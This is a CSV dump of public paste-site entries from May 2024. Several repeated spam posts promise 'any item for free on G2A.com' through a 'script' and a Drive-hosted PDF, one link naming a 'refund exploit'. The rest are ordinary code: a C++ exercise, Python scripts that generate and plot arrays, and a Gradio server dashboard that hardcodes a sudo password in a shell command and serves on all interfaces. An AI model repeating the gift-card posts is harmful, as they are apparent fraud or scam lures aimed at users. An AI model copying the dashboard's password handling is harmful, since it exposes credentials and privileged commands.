id,title,username,language,date,content
9WkeeQXm,🚀G2A.com Free Gift Card Guide MAY 2024 UPDATED🚀,maryke40,GetText,Friday 24th of May 2024 01:03:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
1gbVn4xB,🎉G2A.com Free Gift Card Guide MAY 2024 UPDATED🔥,maryke40,GetText,Friday 24th of May 2024 01:03:12 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
G4NhSgBs,🔥G2A.com Free Gift Card Guide MAY 2024 UPDATED💰,maryke40,GetText,Friday 24th of May 2024 01:03:00 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
QcAb32Ug,🔥G2A.com Free Gift Card Guide MAY 2024 UPDATED🚀,maryke40,GetText,Friday 24th of May 2024 01:02:55 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
P9Hve6fR,🎉G2A.com Free Gift Card Guide MAY 2024 UPDATED💰,maryke40,GetText,Friday 24th of May 2024 12:56:21 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?usp=g2a_refund_exploit_71021023.pdf

Working as of:

24 May 2024"
Dr0Ec12b,Untitled,Josif_tepe,C++,Friday 24th of May 2024 12:26:26 PM CDT,"#include <iostream>
using namespace std;


int main()
{
    string s;
    cin >> s;

    int i = 0;
    int n = s.size();
    long long res = 1;
    while(i < n) {
        if(s[i] == 'T' or s[i] == 't') {
            res *= 3;
            i += 8;
        }
        else if(s[i] == 'D' or s[i] == 'd') {
            res *= 2;
            i += 5;
        }
        else {
            res -= 1;
            i += 5;
        }

    }
    cout << res << endl;
    
    
    return 0;
}
"
E9vjN8MK,plot_test_arrays,Python253,Python,Friday 24th of May 2024 12:17:41 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: plot_test_arrays.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script reads a file containing arrays and plots each array with smooth splines and data point markers.
    It opens each plot individually and allows the user to interact with it, save the image, and then close the plot window.

Requirements:
    - Python 3.x
    - matplotlib
    - numpy
    - scipy

Functions:
    - read_arrays_from_file(filename):
        Reads arrays from a file.
    - plot_array_with_spline(data_array):
        Plots a single array with smooth splines and data point markers.
    - select_file():
        Prompts the user to select a file from the current working directory.

Usage:
    - Run the script and select the file containing the arrays to plot.
""""""

import matplotlib.pyplot as plt
import numpy as np
from scipy.interpolate import make_interp_spline
import re
import os
import sys
from tkinter import Tk
from tkinter.filedialog import askopenfilename

def read_arrays_from_file(filename):
    """"""
    Read arrays from a file.

    Parameters:
    filename (str): The name of the file to read the arrays from.

    Returns:
    list: A list of arrays read from the file.
    """"""
    arrays = []
    with open(filename, 'r') as file:
        for line in file:
            match = re.search(r'\[(.*)\]', line)
            if match:
                array_str = match.group(1)
                array = [float(num) for num in array_str.split(', ')]
                arrays.append(array)
    return arrays

def plot_array_with_spline(data_array):
    """"""
    Plot a single array with smooth splines and data point markers.

    Parameters:
    data_array (list): The array to plot.
    """"""
    x = np.arange(len(data_array))
    y = data_array
    spline = make_interp_spline(x, y)
    x_smooth = np.linspace(x.min(), x.max(), 300)
    y_smooth = spline(x_smooth)

    plt.plot(x_smooth, y_smooth, color='red', linewidth=2, label='Smooth Spline')
    plt.scatter(x, y, color='blue', marker='o', label='Array Points')
    plt.fill_between(x_smooth, y_smooth, color='pink', alpha=0.3)  # Fill under the spline with color
    for j, txt in enumerate(data_array):
        plt.annotate('{:.2f}'.format(txt), (x[j], y[j]), textcoords=""offset points"", xytext=(0,10), ha='center')
    plt.xlabel('Index')
    plt.ylabel('Value')
    plt.title('Array Plot with Smooth Spline')
    plt.legend()
    plt.grid(True)

def select_file():
    """"""
    Prompts the user to select a file from the current working directory.

    Returns:
    str: The selected file path.
    """"""
    root = Tk()
    root.withdraw()  # Hide the main window
    filepath = askopenfilename(initialdir=os.getcwd(), title=""Select a file"", filetypes=[(""Text files"", ""*.txt"")])
    root.destroy()  # Destroy the Tkinter window
    return filepath

if __name__ == ""__main__"":
    # Prompt the user to select a file containing the arrays
    print(""\nSelect the file containing the arrays to plot.\n"")
    file_path = select_file()
    # Catch if the user cancels selection & exit gracefully
    if not file_path:
        print(""\tNo file selected!\n\nExiting Program...   GoodBye!\n"")
        sys.exit(1)

    # Read arrays from the selected file
    arrays = read_arrays_from_file(file_path)

    # Plot each array
    for i, array in enumerate(arrays, start=1):
        print(""Plotting Array {}..."".format(i))
        plot_array_with_spline(array)
        plt.show()
    
    # Exit program
    print(""\nAll plots are complete.\n\nExiting program...   GoodBye!"")
    sys.exit(0)
"
dhLx53sA,generate_test_arrays,Python253,Python,Friday 24th of May 2024 12:16:41 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: generate_test_arrays.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script generates a file with 10 lines of arrays for testing purposes.
    Each array contains random floating-point numbers.

Requirements:
    - Python 3.x

Functions:
    - generate_random_arrays(num_arrays, array_length):
        Generates a list of arrays with random floating-point numbers.
    - save_arrays_to_file(arrays, filename):
        Saves the generated arrays to a file.

Usage:
    - Run the script to generate a file named 'test_arrays.txt' in the current working directory.
""""""

import numpy as np

def generate_random_arrays(num_arrays=10, array_length=10):
    """"""
    Generate a list of arrays with random floating-point numbers.

    Parameters:
    num_arrays (int): Number of arrays to generate.
    array_length (int): Length of each array.

    Returns:
    list: A list of arrays with random floating-point numbers.
    """"""
    generated_arrays = []
    for _ in range(num_arrays):
        random_array = np.random.uniform(low=-5.0, high=5.0, size=array_length).tolist()
        generated_arrays.append(random_array)
    return generated_arrays

def save_arrays_to_file(arrays, filename='test_arrays.txt'):
    """"""
    Save the generated arrays to a file.

    Parameters:
    arrays (list): A list of arrays to save.
    filename (str): The name of the file to save the arrays to.
    """"""
    with open(filename, 'w', encoding='utf-8') as file:
        for index, array in enumerate(arrays, start=1):
            array_str = ', '.join(f'{x:.4f}' for x in array)
            file.write(f""{index} - Item {index} - [{array_str}]\n"")

if __name__ == ""__main__"":
    # Generate 10 arrays with 10 random floating-point numbers each
    num_arrays_to_generate = 10
    array_length_to_generate = 10
    arrays_to_save = generate_random_arrays(num_arrays_to_generate, array_length_to_generate)
    
    # Save the arrays to 'test_arrays.txt'
    save_arrays_to_file(arrays_to_save)
    
    print(f""Generated {num_arrays_to_generate} arrays and saved to 'test_arrays.txt'"")
"
AtzqrbVG,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Friday 24th of May 2024 12:15:28 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
24 May 2024"
8SXiTNRB,Untitled,zerof3565,Python,Friday 24th of May 2024 12:09:27 PM CDT,"import gradio as gr
import psutil
import subprocess
import os
import threading
import time

def get_cpu_load():
    load1, load5, load15 = os.getloadavg()
    return f""1 min: {load1:.2f}, 5 min: {load5:.2f}, 15 min: {load15:.2f}""

def get_cpu_utilization():
    return f""{psutil.cpu_percent(interval=1):.2f} %""

def get_top_processes_by_ram():
    processes = sorted(psutil.process_iter(['pid', 'name', 'memory_info']), key=lambda p: p.info['memory_info'].rss, reverse=True)[:5]
    return ""\n"".join([f""{p.info['name']} (PID: {p.info['pid']}): {p.info['memory_info'].rss / (1024 ** 2):.2f} MB"" for p in processes])

def get_top_processes_by_cpu():
    processes = sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:5]
    return ""\n"".join([f""{p.info['name']} (PID: {p.info['pid']}): {p.info['cpu_percent']:.2f} %"" for p in processes])

def get_disk_partitions():
    partitions = psutil.disk_partitions()
    usage = [psutil.disk_usage(part.mountpoint) for part in partitions]
    return ""\n"".join([f""{part.device}: {use.percent:.2f} % used"" for part, use in zip(partitions, usage)])

def get_kvm_machines():
    command = 'echo ""mypasswordyo"" | sudo -S virsh list --all'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout

def ping_test():
    response = os.system(""ping -c 1 1.1.1.1 > /dev/null 2>&1"")
    return ""Connected"" if response == 0 else ""Not Connected""

internet_status = ""Unknown""

def update_internet_connectivity():
    global internet_status
    while True:
        internet_status = ping_test()
        time.sleep(60)

threading.Thread(target=update_internet_connectivity, daemon=True).start()

with gr.Blocks() as demo:
    gr.Markdown(""# Server Metrics Dashboard"")

    with gr.Row():
        with gr.Column():
            gr.Markdown(""## CPU Load (1/5/15 min)"")
            cpu_load = gr.Textbox(label=""CPU Load"", interactive=False)

        with gr.Column():
            gr.Markdown(""## CPU Utilization"")
            cpu_utilization = gr.Textbox(label=""CPU Utilization"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Top Processes by RAM"")
            processes_by_ram = gr.Textbox(label=""Processes by RAM"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Top Processes by CPU"")
            processes_by_cpu = gr.Textbox(label=""Processes by CPU"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Disk Partitions"")
            disk_partitions = gr.Textbox(label=""Disk Partitions"", interactive=False)

        with gr.Column():
            gr.Markdown(""## KVM Machines"")
            kvm_machines = gr.Textbox(label=""KVM Machines"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Internet Connectivity"")
            internet_connectivity = gr.Textbox(label=""Internet Connectivity"", interactive=False)

    def update_metrics():
        return (
            get_cpu_load(),
            get_cpu_utilization(),
            get_top_processes_by_ram(),
            get_top_processes_by_cpu(),
            get_disk_partitions(),
            get_kvm_machines(),
            internet_status
        )

    demo.load(update_metrics, inputs=[], outputs=[
        cpu_load,
        cpu_utilization,
        processes_by_ram,
        processes_by_cpu,
        disk_partitions,
        kvm_machines,
        internet_connectivity
    ], every=5)

demo.launch(server_name=""0.0.0.0"", server_port=7860)"
